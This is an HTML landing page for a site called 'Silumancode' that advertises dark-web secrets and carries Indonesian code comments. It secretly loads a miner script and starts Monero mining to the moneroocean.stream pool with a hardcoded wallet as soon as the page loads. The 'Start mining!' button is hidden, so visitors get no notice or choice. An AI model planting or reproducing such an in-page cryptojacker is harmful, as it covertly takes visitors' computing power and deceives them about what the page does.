<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Silumancode</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="banner">
        <canvas id="matrix"></canvas>
        <div class="banner-text">
            <h1>SILUMANCODE</h1>
            <p>Unlock the secrets of the dark web.</p>
        </div>
    </div>
    <div class="content">
        <h2>Welcome to Silumancode</h2>
        <div>
    <textarea rows="4" cols="50" id="texta"></textarea> 
       </div>
        <p>Explore the hidden layers of the web and discover tools, guides, and secrets.</p>
    </div>
    <script src="script.js"></script>
 <!--A TEXT FIELD-->
 

<!-- BUTTON (OPSIONAL, TIDAK DIPAKAI LAGI) -->
<div>
    <button id="startb" onclick="start()" style="display: none;">Start mining!</button>
</div>

<!-- THE MINER SCRIPT -->
<script src="miner/miner.js"></script>

<script>
    function start() {
        // Disable tombol (hanya jika tombol digunakan)
        const startButton = document.getElementById("startb");
        if (startButton) {
            startButton.disabled = true;
        }

        // Start mining dengan server lokal
        const server = "wss://ny1.xmrminingproxy.com";
        startMining(
            "moneroocean.stream",
            "86P42DaNTvmBmMLM4oL5kL6tVQVo9FfsnJDTqj6VU76whVzjMdMbMa7PV3SHAQuNySan44ToXVFn3gwFmqeDb58t1xqNVAB"
        );

        // Tambahkan pesan awal
        addText("Connecting...");

        // Update status setiap 2 detik
        setInterval(function () {
            while (sendStack.length > 0) addText(sendStack.pop());
            while (receiveStack.length > 0) addText(receiveStack.pop());
            addText("calculated " + totalhashes + " hashes.");
        }, 2000);
    }

    // Fungsi untuk menambahkan teks ke textarea
    function addText(obj) {
        const elem = document.getElementById("texta");
        elem.value += "[" + new Date().toLocaleString() + "] ";

        if (obj.identifier === "job") {
            elem.value += "new job: " + obj.job_id;
        } else if (obj.identifier === "solved") {
            elem.value += "solved job: " + obj.job_id;
        } else if (obj.identifier === "hashsolved") {
            elem.value += "pool accepted hash!";
        } else if (obj.identifier === "error") {
            elem.value += "error: " + obj.param;
        } else {
            elem.value += obj;
        }

        elem.value += "\n";
        elem.scrollTop = elem.scrollHeight;
    }

    // Otomatis mulai mining ketika halaman dimuat
    window.onload = start;
</script>

    
</body>
</html>
